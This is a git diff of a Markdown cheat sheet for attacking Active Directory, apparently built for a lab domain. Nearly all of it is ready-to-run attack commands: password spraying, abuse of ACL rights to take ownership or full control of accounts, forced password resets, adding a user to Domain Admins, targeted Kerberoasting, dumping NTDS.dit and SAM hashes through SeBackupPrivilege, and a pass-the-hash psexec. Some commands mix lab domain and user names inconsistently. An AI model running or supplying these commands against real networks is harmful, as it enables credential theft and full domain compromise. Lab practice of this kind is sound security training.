@@ -19,11 +19,16 @@ User Brute force
 ```
 wget https://raw.githubusercontent.com/thiagosmith/active-directory/refs/heads/main/users.txt
 ```
+
 Password Spraying
 ```
 nxc smb 192.168.2.0/24 -u users.txt -p 'Senha@123'
 ```
 
+Password Stuffing
+```
+nxc smb 192.168.2.210 -u users -p 'Senha@123'
+```
 
 ## Piviting
 
@@ -280,152 +285,179 @@ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'maria' -tar
 
 roger - - > joao
 
-Vuln Create:
-joao - - > Propriedades - - > Security - - > Add - - > roger - - > Advanced - - > Modify owner
-
 Exploit:
+
 Granting Ownership:
-impacket-owneredit -action write -new-owner 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6
+```
+impacket-owneredit -action write -new-owner 'joao' -target-dn 'CN=roger,CN=Users,DC=redscan,DC=local' 'redscan.local'/'roger':'Password' -dc-ip 192.168.56.200
+```
 
 Granting Full Control:
-impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6
-
+```
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'joao' -target-dn 'CN=roger,CN=Users,DC=redscan,DC=local' 'redscan.local'/'roger':'Password' -dc-ip 192.168.56.200
+```
 
 
 ### VULN 4 - AllExtendedRights: User
 
 ana - - > jose
 
-Vuln Create:
-jose - - > Propriedades - - > Security - - > Add - - > ana - - > Advanced - - > All extended rights
-
 Exploit:
+```
 net rpc password kavish 'Password@987' -U ignite.local/geet%'Password@1' -S 192.168.1.8
-
-
+```
 
 ### VULN 5 - WriteDacl: User
 
 carla - - > rafaela
 
-Vuln Create:
-rafaela - - > Propriedades - - > Security - - > Add - - > carla - - > Advanced - - > Modify permissions
-
-Exploit
-impacket-dacledit -action 'write' -rights 'FullControl' -principal 'komal' -target-dn 'CN=aarti,CN=Users,DC=ignite,DC=local' 'ignite.local'/'komal':'Password@1' -dc-ip 192.168.1.3
-net rpc password aarti 'Password@987' -U ignite.local/komal%'Password@1' -S 192.168.1.3
-./targetedKerberoast.py --dc-ip '192.168.1.3' -v -d 'ignite.local' -u 'komal' -p 'Password@1'
-
+Exploit:
+```
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'carla' -target-dn 'CN=rafaela,CN=Users,DC=redscan,DC=local' 'redscan.local'/'rafaela':'Password' -dc-ip 192.168.56.200
+```
+```
+net rpc password rafaela 'Password@2026' -U redscan.local/carla%'Password' -S 192.168.56.200
+```
+```
+./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'komal' -p 'Password@1'
+```
 
 
 ### VULN 6 - WriteDacl: Group
 
 salesgroup - - > renato
 
-Vuln Create:
-salesgroup - - > Propriedades - - > Security - - > Add - - > renato - - > Advanced - - > Modify permissions
-
 Exploit
-impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'rudra' -target-dn 'CN=salesgroup,CN=Users,DC=ignite,DC=local' 'ignite.local'/'rudra':'Password@1' -dc-ip 192.168.1.3
-net rpc group addmem "Domain Admins" rudra -U ignite.local/rudra%'Password@1' -S 192.168.1.3
-
+```
+impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'rudra' -target-dn 'CN=salesgroup,CN=Users,DC=ignite,DC=local' 'ignite.local'/'rudra':'Password@1' -dc-ip 192.168.56.200
+```
+```
+net rpc group addmem "Domain Admins" rudra -U ignite.local/rudra%'Password@1' -S 192.168.56.200
+```
 
 
 ### VULN 7 - Generic ALL Permissions: User
 
 salesgroup - - > renato
 
-Vuln Create:
-salesgroup - - > Propriedades - - > Security - - > Add - - > renato - - > Advanced - - > Full control
-
 Exploit
-net rpc user -U ignite.local/renato%'Password@1' -S 192.168.1.8
-net rpc group members "salesgroup" -U ignite.local/renato%'Password@1' -S 192.168.1.8
-
-net rpc group addmem "salesgroup" "komal" -U ignite.local/renato%'Password@1' -S 192.168.1.8
-
+```
+net rpc user -U ignite.local/renato%'Password@1' -S 192.168.56.200
+```
+```
+net rpc group members "salesgroup" -U ignite.local/renato%'Password@1' -S 192.168.56.200
+```
+```
+net rpc group addmem "salesgroup" "komal" -U ignite.local/renato%'Password@1' -S 192.168.56.200
+```
 
 
 ### VULN 8 - Generic ALL Permissions: Group
 
 neide - - > joao
 
-Vuln Create:
-joao - - > Propriedades - - > Security - - > Add - - > neide - - > Advanced - - > Full control
-
 Exploit
-net rpc password joao 'Password1!' -U ignite.local/neide%'Password@1' -S 192.168.1.8
+```
+net rpc password joao 'Password1!' -U ignite.local/neide%'Password@1' -S 192.168.56.200
+```
+```
 git clone https://github.com/ShutdownRepo/targetedKerberoast.git
-./targetedKerberoast.py --dc-ip '192.168.1.8' -v -d 'ignite.local' -u 'neide' -p 'Password@1'
-
+```
+```
+./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'neide' -p 'Password@1'
+```
 
 
 ### VULN 9 - GenericWrite: Group
-https://www.hackingarticles.in/genericwrite-active-directory-abuse/
+
 tigroup - - > paty 
 
-Vuln Create:
-tigroup - - > Propriedades - - > Security - - > Add - - > paty - - > Advanced - - > Write
-
 Exploit
-net rpc group addmem "tigroup" paty -U ignite.local/paty%'Password@1' -S 192.168.1.7
-
+```
+net rpc group addmem "tigroup" paty -U ignite.local/paty%'Password@1' -S 192.168.56.200
+```
 
 ### VULN 10 - GenericWrite: Group
 
 sqlservice - - > paty
 
-Vuln Create:
-paty - - > Propriedades - - > Security - - > Add - - > sqlservice - - > Advanced - - > Write
-
 Exploit
+```
 git clone https://github.com/ShutdownRepo/targetedKerberoast.git
-./targetedKerberoast.py --dc-ip '192.168.1.7' -v -d 'ignite.local' -u 'radha' -p 'Password@1'
+```
+```
+./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'radha' -p 'Password@1'
+```
 
 
 ### VULN 11 - SeBackupPrivilege
 backup operators - - > ana
 
 Exploit 1:
+```
+evil-winrm -i 192.168.56.200 -u ana -p password
+```
+```
 reg save hklm\system c:\users\public\system
+```
+```
 reg save hklm\sam c:\users\public\sam
+```
+```
 download ntds.dit
+```
+```
 download system
-
+```
+```
 impacket-secretsdump -sam sam -system system local
-
+```
+```
 impacket-psexec administrator@ip --hashes ntlm
+```
 
 Exploit 2:
+```
 nano xpl.dsh
+```
+```
 set context persistent nowriters
 add volume c: alias xpl
 create
 expose %xpl% z:
+```
+```
 unix2dos xpl.dsh
-
-evil-winrm -i 192.168.1.11 -u raj -p Password@1
+```
+```
+evil-winrm -i 192.168.56.200 -u raj -p Password@1
+```
+```
 cd c:\users\public\
+```
+```
 upload raj.dsh
+```
+```
 diskshadow /s raj.dsh
+```
+```
 robocopy /b z:\windows\ntds . ntds.dit
-
+```
+```
 reg save hklm\system c:\users\public\system
-
+```
+```
 download ntds.dit
+```
+```
 download system
-
+```
+```
 impacket-secretsdump -ntds ntds.dit -system system local
-
-impacket-psexec administrator@ip --hashes ntlm
-
-
-
-
-
-
-
-
-
+```
+```
+impacket-psexec administrator@192.168.56.200 --hashes ntlm
+```
 
 
